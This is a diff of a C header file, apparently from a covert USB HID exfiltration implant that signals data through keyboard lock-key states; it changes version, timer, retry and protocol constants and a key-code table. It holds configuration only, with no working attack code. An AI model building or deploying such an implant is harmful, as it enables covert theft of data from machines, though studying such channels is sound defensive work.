@@ -14,10 +14,13 @@
 
 // -------------------------------------
 // Versioning
-#define REVISION "0.4.1"
+#define REVISION "0.4.8"
 
 // -------------------------------------
 // Protocol
+
+// Iterations to send encoder CQ
+#define INIT_REPEATS 4
 
 // TODO: sort out the MAGIX
 #define MAGIX "CQCQ"
@@ -27,7 +30,7 @@
 // Defaults
 
 // default delay timer for implant
-#define DEFTIMER 20
+#define DEFTIMER 2
 
 // default hid device for listener (unused)
 #define DEFDEVICE "/dev/hidg0"
@@ -37,6 +40,9 @@
 
 // default (dup2) 'verbose' log location
 #define DEBUGLOG "/var/exfil/debug.log"
+
+// timeout to (re)open hidg
+#define RETRY_TIMEOUT 5
 
 // -------------------------------------
 // Debugging and verbosity
@@ -51,39 +57,17 @@ extern int verbose;
 #define VERBOSE(d) if(verbose>=d)
 
 // last seen trybble (the __SCROLL__ bit)
-extern uint8_t lastTrybble;
+extern uint8_t parity;
+
 
 // -------------------------------------
 // Values from standard sources
-/*
-Usage ID    Usage ID    Usage Name
- (Dec)       (Hex)
 
-  57        0x39        Keyboard Caps Lock
-  71        0x47        Keyboard Scroll Lock
-  83        0x53        Keypad Num Lock and Clear
- 130        0x82        Keyboard Locking Caps Lock
- 131        0x83        Keyboard Locking Num Lock
- 132        0x84        Keyboard Locking Scroll Lock
-*/
-
-#define __VK_NUMLOCK__      0x90
-#define __VK_CAPITAL__      0x14
-#define __USB_SCROLL__      0x91
-
-// -------------------------------------
-// Junk
-
-#if 0
-#define xREVISION "$Revision: 2.18 $"
-char revision[32] = {0};
-void setRevision()
-{
-    char *ver = xREVISION;
-    for (int i=0; i<(int)strlen(ver)-11 && ver[i+11]!=' '; i++)
-        revision[i] = ver[i+11];
-}
-#endif
+// _KEY_        | _USB_       | _keybb_event()          | USB_HID codes
+// NUM_LOCK     | 0x01  00001 |   VK_NUMLOCK  0x90  144 |   0x53
+// CAPS_LOCK    | 0x02  00010 |   VK_CAPITAL  0x14   20 |   0x39
+// SCROLL_LOCK  | 0x04  00100 |   VK_SCROLL   0x91  145 |   0x47
+// KANA         | 0x10  10000 |   VK_KANA     0x15   21 |   0x92
 
 #endif
 // -----------------------------------------------------------------------------
